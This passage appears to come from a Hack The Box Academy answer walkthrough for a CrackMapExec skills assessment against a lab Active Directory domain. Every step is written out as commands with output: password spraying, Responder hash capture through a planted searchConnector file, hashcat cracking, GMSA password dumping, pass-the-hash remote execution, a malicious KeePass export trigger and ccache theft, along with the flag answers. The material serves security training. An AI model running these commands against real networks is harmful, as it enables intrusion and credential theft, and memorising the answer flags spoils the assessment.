672fcd2905506a3ac0a2290d482c4f90bba886b55f035d2b27029896e83cb8170ac5ff93c91fd32f6b51c0251b16262528be1ebb7ee4531c512e593ae0c14c7376f39ddef523394e150b67321ecf2d6954f47df045a055c900689afb71876a546f572d0ad52464c8de4f8a374d0b92af4ebec219d72aff620799889004229d0f957682d7d6cb9cd246a871a42b1793a1dd74786ed852f6a5b86572b2c6c39a30467b1f171645fbead8bc83348be4:hooters1
```

Having compromised a new set of credentials (`Atul:hooters1`), students need to enumerate shares on the domain controller:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --shares
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
SMB         172.16.15.3     445    DC01             [+] Enumerated shares
SMB         172.16.15.3     445    DC01             Share           Permissions     Remark
SMB         172.16.15.3     445    DC01             -----           -----------     ------
SMB         172.16.15.3     445    DC01             ADMIN$                          Remote Admin
SMB         172.16.15.3     445    DC01             C$                              Default share
SMB         172.16.15.3     445    DC01             Ccache                          Ccache Files for Users
SMB         172.16.15.3     445    DC01             CertEnroll      READ            Active Directory Certificate Services share
SMB         172.16.15.3     445    DC01             DEV             READ            Development Share
SMB         172.16.15.3     445    DC01             DEV_INTERN                      Development Share for Interns
SMB         172.16.15.3     445    DC01             IPC$            READ            Remote IPC
SMB         172.16.15.3     445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.15.3     445    DC01             SYSVOL          READ            Logon server share 
```

Using the spider and pattern options, students need to look for text files on the DEV share:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --spider DEV --pattern txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --spider DEV --pattern txt

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
SMB         172.16.15.3     445    DC01             [*] Started spidering
SMB         172.16.15.3     445    DC01             [*] Spidering .
SMB         172.16.15.3     445    DC01             //172.16.15.3/DEV/note.txt [lastm:'2022-12-08 18:32' size:242]
SMB         172.16.15.3     445    DC01             //172.16.15.3/DEV/sql_dev_creds.txt [lastm:'2022-12-08 19:36' size:40]
```

After discovering the two text files, students need to download them to their attack host:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --share DEV --get-file note.txt note.txt
proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --share DEV --get-file sql_dev_creds.txt sql_dev_creds.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --share DEV --get-file note.txt note.txt

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
SMB         172.16.15.3     445    DC01             [*] Copy note.txt to note.txt
SMB         172.16.15.3     445    DC01             [+] File note.txt was transferred to note.txt
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --share DEV --get-file sql_dev_creds.txt sql_dev_creds.txt

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
SMB         172.16.15.3     445    DC01             [*] Copy sql_dev_creds.txt to sql_dev_creds.txt
SMB         172.16.15.3     445    DC01             [+] File sql_dev_creds.txt was transferred to sql_dev_creds.txt
```

Sensitive information such as credentials are often left in scripts and files on open file shares. Students need to check the sql\_dev\_creds.txt file to further the attack chain:

Code: shell

```shell
cat sql_dev_creds.txt 
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ cat sql_dev_creds.txt 
��sqldev:Sq!D3vUs3R
```

Subsequently, students need to reuse these credentials against the `mssql` service on SQL01:

Code: shell

```shell
proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R 
```

The credentials are valid against the SQL01 host. Students need to now check for local privilege escalation vectors:

Code: shell

```shell
proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -M mssql_priv
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -M mssql_priv

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R 
MSSQL_PR... 172.16.15.15    1433   SQL01            [+] sqldev can impersonate netdb (sysadmin)
```

The module reveals that students can impersonate the `netdb` user:

Code: shell

```shell
proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -M mssql_priv -o ACTION=privesc
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -M mssql_priv -o ACTION=privesc

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R 
MSSQL_PR... 172.16.15.15    1433   SQL01            [+] sqldev can impersonate netdb (sysadmin)
MSSQL_PR... 172.16.15.15    1433   SQL01            [+] sqldev is now a sysadmin! (Pwn3d!)
```

Finally, students can read the flag:

Code: shell

```shell
proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -x "more C:\Users\Public\flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -x "more C:\Users\Public\flag.txt"

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            [+] Executed command via mssqlexec
MSSQL       172.16.15.15    1433   SQL01            --------------------------------------------------------------------------------
MSSQL       172.16.15.15    1433   SQL01            R3Us3_D4t@_Fr0m_DB
```

Answer: `R3Us3_D4t@_Fr0m_DB`

# Skills Assessment

## Question 3

### "Gain access to the SQL01 and submit the contents of the flag located in C:\\Users\\Public\\flag.txt."

Students now have permissions to enumerate the `mssql` database itself, and need to start by checking the tables in the interns database:

Code: shell

```shell
roxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES"

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            table_name
MSSQL       172.16.15.15    1433   SQL01            --------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.15.15    1433   SQL01            details
```

Enumerating further, students need to inspect the details table:

Code: shell

```shell
proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -q "SELECT * from [interns].[dbo].details"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -q "SELECT * from [interns].[dbo].details"
MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            intern_id
MSSQL       172.16.15.15    1433   SQL01            intern_pass
MSSQL       172.16.15.15    1433   SQL01            --------------------------------------------------
MSSQL       172.16.15.15    1433   SQL01            --------------------------------------------------
MSSQL       172.16.15.15    1433   SQL01            intern1
MSSQL       172.16.15.15    1433   SQL01            Welcome1

<SNIP>

MSSQL       172.16.15.15    1433   SQL01            intern33
MSSQL       172.16.15.15    1433   SQL01            Welcome1
```

Using the contents to create a list of usernames (intern1 to intern30):

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ cat internusers.txt 
intern1
intern2
intern3
intern4
intern5
intern6
intern7
intern8
intern9
intern10
intern11
intern12
intern13
intern14
intern15
intern16
intern17
intern18
intern19
intern20
intern21
intern22
intern23
intern24
intern25
intern26
intern27
intern28
intern29
intern30
```

Students need to spray this user list against a weak default password, which is "Welcome1":

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u internusers.txt -p Welcome1
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u internusers.txt -p Welcome1

<SNIP>

SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\intern30:Welcome1 
```

Another set of credentials is confirmed, this time `intern30:Welcome1`. Students need to check access to shared folders:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u intern30 -p Welcome1 --shares
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u intern30 -p Welcome1 --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\intern30:Welcome1 
SMB         172.16.15.3     445    DC01             [+] Enumerated shares
SMB         172.16.15.3     445    DC01             Share           Permissions     Remark
SMB         172.16.15.3     445    DC01             -----           -----------     ------
SMB         172.16.15.3     445    DC01             ADMIN$                          Remote Admin
SMB         172.16.15.3     445    DC01             C$                              Default share
SMB         172.16.15.3     445    DC01             Ccache                          Ccache Files for Users
SMB         172.16.15.3     445    DC01             CertEnroll      READ            Active Directory Certificate Services share
SMB         172.16.15.3     445    DC01             DEV                             Development Share
SMB         172.16.15.3     445    DC01             DEV_INTERN      READ,WRITE      Development Share for Interns
SMB         172.16.15.3     445    DC01             IPC$            READ            Remote IPC
SMB         172.16.15.3     445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.15.3     445    DC01             SYSVOL          READ            Logon server share 
```

Students will find read and write access to the DEV\_INTERN share. Next, they should prepare responder:

Code: shell

```shell
sudo responder -I tun0
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

<SNIP>

[+] Listening for events...
```

Subsequently, students need to use the `drop-sc` module in order to perform the NTLM relay:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u intern30 -p Welcome1 -M drop-sc -o URL=\\\\PWNIP\\secret FILENAME=secret
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u intern30 -p Welcome1 -M drop-sc -o URL=\\\\10.10.15.68\\secret FILENAME=secret
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\intern30:Welcome1 
DROP-SC     172.16.15.3     445    DC01             [+] Found writable share: DEV_INTERN
DROP-SC     172.16.15.3     445    DC01             [+] Created secret.searchConnector-ms file on the DEV_INTERN share
```

```
[SMB] NTLMv2-SSP Client   : 10.129.204.182
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\james
[SMB] NTLMv2-SSP Hash     : james::INLANEFREIGHT:5a18c9a5bf536f6e:276353322CA222CB66B9936187443724:0101000000000000009ED1764F2BD901B64002D7AFB17E160000000002000800440043003100390001001E00570049004E002D005700470044004A005A0050004A00590057003900410004003400570049004E002D005700470044004A005A0050004A0059005700390041002E0044004300310039002E004C004F00430041004C000300140044004300310039002E004C004F00430041004C000500140044004300310039002E004C004F00430041004C0007000800009ED1764F2BD90106000400020000000800300030000000000000000000000000210000EF9E5C2EFCD74A75ED40B47F202D752A08F3B4DC719E97DFF874FB89219C401B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00360038000000000000000000
```

Capturing yet another hash, students need to save it to a file and crack it with hashcat:

Code: shell

```shell
hashcat -m 5600 james.hash /usr/share/wordlists/rockyou.txt --force
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ hashcat -m 5600 james.hash /usr/share/wordlists/rockyou.txt --force

hashcat (v6.1.1) starting...

<SNIP>

JAMES::INLANEFREIGHT:5a18c9a5bf536f6e:276353322ca222cb66b9936187443724:0101000000000000009ed1764f2bd901b64002d7afb17e160000000002000800440043003100390001001e00570049004e002d005700470044004a005a0050004a00590057003900410004003400570049004e002d005700470044004a005a0050004a0059005700390041002e0044004300310039002e004c004f00430041004c000300140044004300310039002e004c004f00430041004c000500140044004300310039002e004c004f00430041004c0007000800009ed1764f2bd90106000400020000000800300030000000000000000000000000210000ef9e5c2efcd74a75ed40b47f202d752a08f3b4dc719e97dff874fb89219c401b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00360038000000000000000000:04apple
```

Students need to enumerate GMSA accounts:

Code: shell

```shell
proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"

MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R (Pwn3d!)
MSSQL       172.16.15.15    1433   SQL01            [+] Executed command via mssqlexec
MSSQL       172.16.15.15    1433   SQL01            --------------------------------------------------------------------------------
MSSQL       172.16.15.15    1433   SQL01            #< CLIXML
MSSQL       172.16.15.15    1433   SQL01            DistinguishedName                          : CN=svc_devadm,CN=Managed Service Accounts,DC=INLANEFREIGHT,DC=LOCAL
MSSQL       172.16.15.15    1433   SQL01            Enabled                                    : True
MSSQL       172.16.15.15    1433   SQL01            Name                                       : svc_devadm
MSSQL       172.16.15.15    1433   SQL01            ObjectClass                                : msDS-GroupManagedServiceAccount
MSSQL       172.16.15.15    1433   SQL01            ObjectGUID                                 : 529a80c9-10d3-40f1-84f9-9363007476f9
MSSQL       172.16.15.15    1433   SQL01            PrincipalsAllowedToRetrieveManagedPassword : {CN=james,CN=Users,DC=INLANEFREIGHT,DC=LOCAL}
MSSQL       172.16.15.15    1433   SQL01            SamAccountName                             : svc_devadm$
MSSQL       172.16.15.15    1433   SQL01            SID                                        : S-1-5-21-3514599724-1682172728-4136368490-4646

<SNIP>
```

Using `jame's` credentials to get the GMSA password for `svc_devadm$`:

Code: shell

```shell
proxychains4 -q crackmapexec ldap 172.16.15.3 -u james -p 04apple --gmsa
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec ldap 172.16.15.3 -u james -p 04apple --gmsa

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.15.3     636    DC01             [+] INLANEFREIGHT.LOCAL\james:04apple 
LDAP        172.16.15.3     636    DC01             [*] Getting GMSA Passwords
LDAP        172.16.15.3     636    DC01             Account: svc_devadm$          NTLM: 93bc545f18898ea7fad983b707e3ad75
```

Students are now able to enumerate machines as `svc_devadm$`, passing the hash to achieve remote code execution:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.20 -u 'svc_devadm$' -H 93bc545f18898ea7fad983b707e3ad75 -x "more c:\users\administrator\desktop\flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.20 -u 'svc_devadm$' -H 93bc545f18898ea7fad983b707e3ad75 -x "more c:\users\administrator\desktop\flag.txt"

SMB         172.16.15.20    445    DEV01            [*] Windows 10.0 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\svc_devadm$:93bc545f18898ea7fad983b707e3ad75 (Pwn3d!)
SMB         172.16.15.20    445    DEV01            [+] Executed command 
SMB         172.16.15.20    445    DEV01            W3_F1nD_Cr3d$_EverY_Wh3re
```

Finally, the flag is read to be `W3_F1nD_Cr3d$_EverY_Wh3re`.

Answer: `W3_F1nD_Cr3d$_EverY_Wh3re`

# Skills Assessment

## Question 4

### "Read the flag from the shared folder Ccache"

Now that students have admin privileges on `DEV01`, they need to use the `keepass_discover` module to identify a `keepass` database:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.20 -u 'svc_devadm$' -H 93bc545f18898ea7fad983b707e3ad75 -M keepass_discover
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.20 -u 'svc_devadm$' -H 93bc545f18898ea7fad983b707e3ad75 -M keepass_discover

SMB         172.16.15.20    445    DEV01            [*] Windows 10.0 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\svc_devadm$:93bc545f18898ea7fad983b707e3ad75 (Pwn3d!)
KEEPASS_... 172.16.15.20    445    DEV01            [*] No KeePass-related process was found
KEEPASS_... 172.16.15.20    445    DEV01            Found C:\Users\Administrator\AppData\Roaming\KeePass\KeePass.config.xml
KEEPASS_... 172.16.15.20    445    DEV01            Found C:\Users\Administrator\Application Data\KeePass\KeePass.config.xml
KEEPASS_... 172.16.15.20    445    DEV01            Found C:\Users\Administrator\Desktop\Database_devadm.kdbx
```

Then, students need to use the module `keepass_trigger` to capture the content of the database.

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.20 -u svc_devadm$ -H 93bc545f18898ea7fad983b707e3ad75 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/Administrator/AppData/Roaming/KeePass/KeePass.config.xml
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.20 -u svc_devadm$ -H 93bc545f18898ea7fad983b707e3ad75 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/Administrator/AppData/Roaming/KeePass/KeePass.config.xml

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB         172.16.15.20    445    DEV01            [*] Windows 10.0 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\svc_devadm$:93bc545f18898ea7fad983b707e3ad75 (Pwn3d!)
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [*] Adding trigger "export_database" to "C:/Users/Administrator/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 172.16.15.20    445    DEV01            [+] Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [-] No running KeePass process found, aborting restart
KEEPASS_... 172.16.15.20    445    DEV01            [*] Polling for database export every 5 seconds, please be patient
KEEPASS_... 172.16.15.20    445    DEV01            [*] we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything
...
KEEPASS_... 172.16.15.20    445    DEV01            [+] Found database export !
KEEPASS_... 172.16.15.20    445    DEV01            [+] Moved remote "C:\Users\Public\export.xml" to local "/tmp/export.xml"
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [*] Cleaning everything..
KEEPASS_... 172.16.15.20    445    DEV01            [*] No export found in C:\Users\Public , everything is cleaned
KEEPASS_... 172.16.15.20    445    DEV01            [*] Found trigger "export_database" in configuration file, removing
KEEPASS_... 172.16.15.20    445    DEV01            [-] No running KeePass process found, aborting restart
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [*] Extracting password..
```

More credentials are to be found in the export.xml:

Code: shell

```shell
cat /tmp/export.xml 
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ cat /tmp/export.xml 

<SNIP>
				</String>
				<String>
					<Key>Password</Key>
					<Value ProtectInMemory="True">ASU934as0-dm23asd!</Value>
				</String>
```

Compromising a new set of credentials `nick:ASU934as0-dm23asd!`, students need to enumerate shares on the DC:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --shares
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\nick:ASU934as0-dm23asd! 
SMB         172.16.15.3     445    DC01             [+] Enumerated shares
SMB         172.16.15.3     445    DC01             Share           Permissions     Remark
SMB         172.16.15.3     445    DC01             -----           -----------     ------
SMB         172.16.15.3     445    DC01             ADMIN$                          Remote Admin
SMB         172.16.15.3     445    DC01             C$                              Default share
SMB         172.16.15.3     445    DC01             Ccache          READ,WRITE      Ccache Files for Users
SMB         172.16.15.3     445    DC01             CertEnroll      READ            Active Directory Certificate Services share
SMB         172.16.15.3     445    DC01             DEV                             Development Share
SMB         172.16.15.3     445    DC01             DEV_INTERN                      Development Share for Interns
SMB         172.16.15.3     445    DC01             IPC$            READ            Remote IPC
SMB         172.16.15.3     445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.15.3     445    DC01             SYSVOL          READ            Logon server share 
```

The Ccache share has read and write privileges. Students need to spider the share to search for the flag.

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --spider Ccache --regex .
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --spider Ccache --regex .

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\nick:ASU934as0-dm23asd! 
SMB         172.16.15.3     445    DC01             [*] Started spidering
SMB         172.16.15.3     445    DC01             [*] Spidering .
SMB         172.16.15.3     445    DC01             //172.16.15.3/Ccache/. [dir]
SMB         172.16.15.3     445    DC01             //172.16.15.3/Ccache/.. [dir]
SMB         172.16.15.3     445    DC01             //172.16.15.3/Ccache/flag.txt [lastm:'2022-12-15 19:56' size:27]
SMB         172.16.15.3     445    DC01             //172.16.15.3/Ccache/svc_inlaneadm@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches [lastm:'2023-01-18 16:03' size:1484]
SMB         172.16.15.3     445    DC01             [*] Done spidering (Completed in 0.5753636360168457)
```

Once the content of the share has been revealed, students need to get the flag:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --share Ccache --get-file flag.txt flag.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --share Ccache --get-file flag.txt flag.txt
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\nick:ASU934as0-dm23asd! 
SMB         172.16.15.3     445    DC01             [*] Copy flag.txt to flag.txt
SMB         172.16.15.3     445    DC01             [+] File flag.txt was transferred to flag.txt
```

At last, the flag can be read:

Code: shell

```shell
cat flag.txt
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ cat flag.txt

Non_D0m41n_@dM1ns_H@s_Privs
```

Answer: `Non_D0m41n_@dM1ns_H@s_Privs`

# Skills Assessment

## Question 5

### "Gain access to the DC01 and submit the contents of the flag located in C:\\Users\\Administrator\\Desktop\\flag.txt."

Students need to download the `ccache` file:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --share Ccache --get-file 'svc_inlaneadm@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches' svc_inlaneadm.ccache
```

```
